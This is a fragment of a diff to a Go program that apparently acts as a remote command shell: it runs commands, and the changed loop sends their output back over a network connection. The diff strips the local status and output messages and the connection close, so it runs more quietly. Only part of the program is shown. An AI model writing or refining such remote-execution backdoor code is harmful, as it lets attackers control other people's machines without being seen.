@@ -44,9 +44,7 @@ func main() {
 			fmt.Println("%s", err)
 		}
 
-		fmt.Println("Command Successfully Executed")
 		output := string(out[:])
-		fmt.Println(output)
 		fmt.Fprintf(conn, output)
 
 		/*
@@ -54,15 +52,5 @@ func main() {
 			cmd = exec.Command("dir")
 		}
 		*/
-
-		/*
-		err := cmd.Run()
-		if err != nil {
-			log.Fatalf("cmd.Run() failed with %s\n", err)
-		}
-		*/
-
-		fmt.Println("Finished")
 	}
-	conn.Close()
 }
